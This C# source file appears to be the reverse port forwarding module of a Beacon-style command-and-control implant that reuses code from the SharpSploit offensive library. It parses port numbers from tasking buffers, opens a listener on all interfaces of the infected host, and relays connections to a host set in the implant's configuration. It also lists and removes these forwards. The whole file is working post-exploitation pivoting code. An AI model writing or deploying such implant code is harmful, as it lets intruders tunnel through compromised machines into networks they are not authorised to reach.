using System.Net;
using System.Linq;
using System.Threading;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Collections;
using System.Text;
using System;
using Beacon.Utils;
using Beacon.Profiles;

namespace Beacoon.Core
{
    ///<summary>
    ///ReversePortForwarding是一个允许添加和删除反向端口转发的类。
    ///</summary> 
    public class Forward
    {
        public class ReversePortForward
        {
            public IPAddress BindAddress { get; set; }
            public int BindPort { get; set; }
            public IPAddress ForwardAddress { get; set; }
            public int ForwardPort { get; set; }
        }

        private static List<ReversePortForward> _reversePortForwards = new List<ReversePortForward>();
        private static Dictionary<int, Socket> _boundSockets = new Dictionary<int, Socket>();

        public static byte[] CreateReversePortForward(byte[] Buff)
        {
            byte[] pPort = new byte[2];
            Array.Copy(Buff, 0, pPort, 0, 2);                              
            Array.Reverse(pPort);
            short nPid = BitConverter.ToInt16(pPort, 0);

            if (Forward.CreateReversePortForward(nPid, Config._sForwardHost, Config._nForwardPort))
            {
                return Bytes.FromString("ok");
            }

            return Bytes.FromString("failed");
        }


        ///<summary>
        ///在本地创建端口转发。
        ///</summary>
        ///<param name="BindPort">在本地绑定的端口。</param>
        ///<param name="ForwardAddress">要将流量转发到的目标IP地址或DNS名称。</param>
        ///<param name="ForwardPort">要将流量转发到的目标端口。</param>
        ///<returns>Bool.</returns> 
        public static bool CreateReversePortForward(int BindPort, string ForwardAddress, int ForwardPort)
        {
            // If ForwardHost is not a valid IP, try to resolve it as DNS.
            if (!IPAddress.TryParse(ForwardAddress, out IPAddress forwardAddress))
            {
                try
                {
                    var ipHostInfo = Dns.GetHostEntry(ForwardAddress);
                    forwardAddress = ipHostInfo.AddressList[0];
                }
                catch
                {
                    return false;
                }
            }
            return CreateReversePortForward(BindPort, forwardAddress, ForwardPort);
        }

        ///<summary>
        ///在本地创建端口转发。
        ///</summary>
        ///<param name="BindPort">在本地绑定的端口。</param>
        ///<param name="ForwardAddress">要将流量转发到的目标IP地址或DNS名称。</param>
        ///<param name="ForwardPort">要将流量转发到的目标端口。</param>
        ///<returns>Bool.</returns>
        public static bool CreateReversePortForward(int BindPort, IPAddress ForwardAddress, int ForwardPort)
        {
            // Check if bindPort is not already bound.
            if (_boundSockets.ContainsKey(BindPort))
            {
                return false;
            }

            // Bind the sockets
            Socket boundSocket = BindSocket(IPAddress.Any, BindPort);
            if (boundSocket == null)
            {
                return false;
            }

            ReversePortForward newReversePortForward = new ReversePortForward
            {
                BindAddress = IPAddress.Any,
                BindPort = BindPort,
                ForwardAddress = ForwardAddress,
                ForwardPort = ForwardPort
            };

            // Add to Lists
            _reversePortForwards.Add(newReversePortForward);
            _boundSockets[BindPort] = boundSocket;

            // Kick off client sockets in new thread.
            new Thread(() => CreateClientSocketThread(boundSocket, ForwardAddress, ForwardPort)).Start();
            return true;
        }


        public static byte[] DeleteReversePortForward(byte[] Buff)
        {
            byte[] pPort = new byte[2];
            Array.Copy(Buff, 0, pPort, 0, 2);                             
            Array.Reverse(pPort);
            short nPid = BitConverter.ToInt16(pPort, 0);

            if (Forward.DeleteReversePortForward(nPid))
            {
                return Bytes.FromString("ok");
            }
            return Bytes.FromString("fail");
        }

        ///<summary>
        ///删除在本地绑定的端口。
        ///</summary>
        ///<param name="BindPort">删除在本地绑定的端口。</param>
        ///<returns>Bool.</returns> 
        public static bool DeleteReversePortForward(int BindPort)
        {
            if (!_boundSockets.TryGetValue(BindPort, out Socket socket))
            {
                return false;
            }

            try
            {
                try { socket.Shutdown(SocketShutdown.Both); }
                catch (SocketException) { }
                socket.Close();

                _boundSockets.Remove(BindPort);

                ReversePortForward reversePortForward = _reversePortForwards.FirstOrDefault(r => r.BindPort.Equals(BindPort));
                _reversePortForwards.Remove(reversePortForward);

                return true;
            }
            catch { }

            return false;
        }

        ///<summary>
        ///获取在本地绑定的端口列表。
        ///</summary>
        ///<returns>绑定的活动端口列表</returns> 
        public static SharpSploitResultList<ReversePortFwdResult> GetReversePortForwards()
        {
            SharpSploitResultList<ReversePortFwdResult> reversePortForwards = new SharpSploitResultList<ReversePortFwdResult>();

            foreach (ReversePortForward rportfwd in _reversePortForwards)
            {
                reversePortForwards.Add(new ReversePortFwdResult
                {
                    BindAddresses = rportfwd.BindAddress.ToString(),
                    BindPort = rportfwd.BindPort,
                    ForwardAddress = rportfwd.ForwardAddress.ToString(),
                    ForwardPort = rportfwd.ForwardPort
                });
            }
            return reversePortForwards;
        }

        ///<summary>
        ///删除在本地绑定的端口列表。
        ///</summary> 
        public static void FlushReversePortFowards()
        {
            try
            {
                foreach (Socket socket in _boundSockets.Values)
                {
                    try { socket.Shutdown(SocketShutdown.Both); }
                    catch (SocketException) { }
                    socket.Close();
                }

                _boundSockets.Clear();
                _reversePortForwards.Clear();
            }
            catch { }
        }

        private static Socket BindSocket(IPAddress BindAddress, int BindPort)
        {
            IPEndPoint localEP = new IPEndPoint(BindAddress, BindPort);
            Socket socket = new Socket(BindAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            try
            {
                socket.Bind(localEP);
                socket.Listen(10);
            }
            catch (SocketException) { }
            return socket;
        }

        private static void CreateClientSocketThread(Socket BoundSocket, IPAddress ForwardAddress, int ForwardPort)
        {
            IPEndPoint remoteEP = new IPEndPoint(ForwardAddress, ForwardPort);

            while (true)
            {
                byte[] boundBuffer = new byte[1024];
                byte[] clientBuffer = new byte[1048576];

                try
                {
                    // Receive data on bound socket
                    Socket handler = BoundSocket.Accept();
                    handler.Receive(boundBuffer);

                    // Create new client socket
                    using (Socket clientSocket = new Socket(ForwardAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
                    {
                        try
                        {
                            clientSocket.Connect(remoteEP);
                            clientSocket.Send(boundBuffer);
                            clientSocket.Receive(clientBuffer);
                        }
                        catch (SocketException) { }
                    }
                    handler.Send(clientBuffer);
                }
                catch { }
            }
        }

        public sealed class ReversePortFwdResult : SharpSploitResult
        {
            public string BindAddresses { get; set; }
            public int BindPort { get; set; }
            public string ForwardAddress { get; set; }
            public int ForwardPort { get; set; }
            protected internal override IList<SharpSploitResultProperty> ResultProperties
            {
                get
                {
                    return new List<SharpSploitResultProperty> {
                        new SharpSploitResultProperty { Name = "BindAddresses", Value = this.BindAddresses },
                        new SharpSploitResultProperty { Name = "BindPort", Value = this.BindPort },
                        new SharpSploitResultProperty { Name = "ForwardAddress", Value = this.ForwardAddress },
                        new SharpSploitResultProperty { Name = "ForwardPort", Value = this.ForwardPort }
                    };
                }
            }
        }


        public class SharpSploitResultList<T> : IList<T> where T : SharpSploitResult
        {
            private List<T> Results { get; } = new List<T>();

            public int Count => Results.Count;
            public bool IsReadOnly => ((IList<T>)Results).IsReadOnly;


            private const int PROPERTY_SPACE = 3;

            /// <summary>
            /// Formats a SharpSploitResultList to a string similar to PowerShell's Format-List function.
            /// </summary>
            /// <returns>string</returns>
            public string FormatList()
            {
                return this.ToString();
            }

            private string FormatTable()
            {
                // TODO
                return "";
            }

            /// <summary>
            /// Formats a SharpSploitResultList as a string. Overrides ToString() for convenience.
            /// </summary>
            /// <returns>string</returns>
            public override string ToString()
            {
                if (this.Results.Count > 0)
                {
                    StringBuilder labels = new StringBuilder();
                    StringBuilder underlines = new StringBuilder();
                    List<StringBuilder> rows = new List<StringBuilder>();
                    for (int i = 0; i < this.Results.Count; i++)
                    {
                        rows.Add(new StringBuilder());
                    }
                    for (int i = 0; i < this.Results[0].ResultProperties.Count; i++)
                    {
                        labels.Append(this.Results[0].ResultProperties[i].Name);
                        underlines.Append(new string('-', this.Results[0].ResultProperties[i].Name.Length));
                        int maxproplen = 0;
                        for (int j = 0; j < rows.Count; j++)
                        {
                            SharpSploitResultProperty property = this.Results[j].ResultProperties[i];
                            string ValueString = property.Value.ToString();
                            rows[j].Append(ValueString);
                            if (maxproplen < ValueString.Length)
                            {
                                maxproplen = ValueString.Length;
                            }
                        }
                        if (i != this.Results[0].ResultProperties.Count - 1)
                        {
                            labels.Append(new string(' ', Math.Max(2, maxproplen + 2 - this.Results[0].ResultProperties[i].Name.Length)));
                            underlines.Append(new string(' ', Math.Max(2, maxproplen + 2 - this.Results[0].ResultProperties[i].Name.Length)));
                            for (int j = 0; j < rows.Count; j++)
                            {
                                SharpSploitResultProperty property = this.Results[j].ResultProperties[i];
                                string ValueString = property.Value.ToString();
                                rows[j].Append(new string(' ', Math.Max(this.Results[0].ResultProperties[i].Name.Length - ValueString.Length + 2, maxproplen - ValueString.Length + 2)));
                            }
                        }
                    }
                    labels.AppendLine();
                    labels.Append(underlines.ToString());
                    foreach (StringBuilder row in rows)
                    {
                        labels.AppendLine();
                        labels.Append(row.ToString());
                    }
                    return labels.ToString();
                }
                return "";
            }

            public T this[int index] { get => Results[index]; set => Results[index] = value; }

            public IEnumerator<T> GetEnumerator()
            {
                return Results.Cast<T>().GetEnumerator();
            }

            IEnumerator IEnumerable.GetEnumerator()
            {
                return Results.Cast<T>().GetEnumerator();
            }

            public int IndexOf(T item)
            {
                return Results.IndexOf(item);
            }

            public void Add(T t)
            {
                Results.Add(t);
            }

            public void AddRange(IEnumerable<T> range)
            {
                Results.AddRange(range);
            }

            public void Insert(int index, T item)
            {
                Results.Insert(index, item);
            }

            public void RemoveAt(int index)
            {
                Results.RemoveAt(index);
            }

            public void Clear()
            {
                Results.Clear();
            }

            public bool Contains(T item)
            {
                return Results.Contains(item);
            }

            public void CopyTo(T[] array, int arrayIndex)
            {
                Results.CopyTo(array, arrayIndex);
            }

            public bool Remove(T item)
            {
                return Results.Remove(item);
            }
        }

        public abstract class SharpSploitResult
        {
            protected internal abstract IList<SharpSploitResultProperty> ResultProperties { get; }
        }


        public class SharpSploitResultProperty
        {
            public string Name { get; set; }
            public object Value { get; set; }
        }
    }
}